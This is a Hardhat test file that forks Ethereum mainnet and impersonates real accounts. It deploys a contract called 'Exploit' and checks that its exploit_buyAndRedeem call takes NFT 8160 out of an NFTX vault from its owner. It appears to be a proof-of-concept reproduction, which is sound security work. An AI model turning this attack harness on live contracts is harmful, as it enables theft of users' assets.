const { expect } = require("chai");
const { expectRevert, expectException } = require("../../utils/expectRevert");

const { BigNumber } = require("@ethersproject/bignumber");
const { ethers, network } = require("hardhat");
const { utils } = ethers;
const { formatEther, parseEther } = utils;

const BASE = BigNumber.from(10).pow(18);

let zetsu, dao, holder;
let factory, nft, coin, exploit;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

describe("Mainnet unstaking test ERC721", function () {
  before("Setup", async () => {
    await network.provider.request({
      method: "hardhat_reset",
      params: [
        {
          forking: {
            jsonRpcUrl: `https://eth-mainnet.alchemyapi.io/v2/${process.env.ALCHEMY_MAINNET_API_KEY}`,
            blockNumber: 15527060,
          },
        },
      ],
    });

    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0xc6c2d5ee69745a1e9f2d1a06e0ef0788bd924302"],
    });
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0x40d73df4f99bae688ce3c23a01022224fe16c7b2"],
    });

    zetsu = await ethers.provider.getSigner("0xc6c2d5ee69745a1e9f2d1a06e0ef0788bd924302");
    dao = await ethers.provider.getSigner("0x40d73df4f99bae688ce3c23a01022224fe16c7b2");

    factory = await ethers.getContractAt(
      "NFTXVaultFactoryUpgradeable",
      "0xBE86f647b167567525cCAAfcd6f881F1Ee558216"
    );

    nft = await ethers.getContractAt("IERC721Upgradeable", "0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e");
    coin = await ethers.getContractAt("IERC20Upgradeable", "0x0CB8af226d28116f01C85324B0d920A6128178FB");
  });

  it("Should deploy exploit", async () => {
    const Exploit = await ethers.getContractFactory("Exploit");
    exploit = await Exploit.deploy();
    await exploit.deployed();
  });

  it("Should run exploit successfully", async () => {
    const router = await ethers.getContractAt("IUniswapV2Router01", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F");

    // Buy JABBA
    await router
      .connect(zetsu)
      .swapETHForExactTokens(
        utils.parseEther("2.1"),
        ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0x0CB8af226d28116f01C85324B0d920A6128178FB"],
        zetsu._address,
        9999999999,
        { value: utils.parseEther("0.5") }
      );

    // Send some ETH to zap
    await zetsu.sendTransaction({
      to: exploit.address,
      value: ethers.utils.parseEther("1"),
    });
    // Send some JABBA to zap
    await coin.connect(zetsu).transfer("0xbbc53022Af15Bb973AD906577c84784c47C14371", utils.parseEther("2"));

    const originOwner = await nft.ownerOf(8160);
    console.log("Original owner", originOwner);

    // Run exploit
    await exploit.connect(zetsu).exploit_buyAndRedeem();

    const newOwner = await nft.ownerOf(8160);
    console.log("New owner", newOwner);
    expect(newOwner).to.equal(exploit.address);
    expect(newOwner).to.not.equal(originOwner);
  });
});
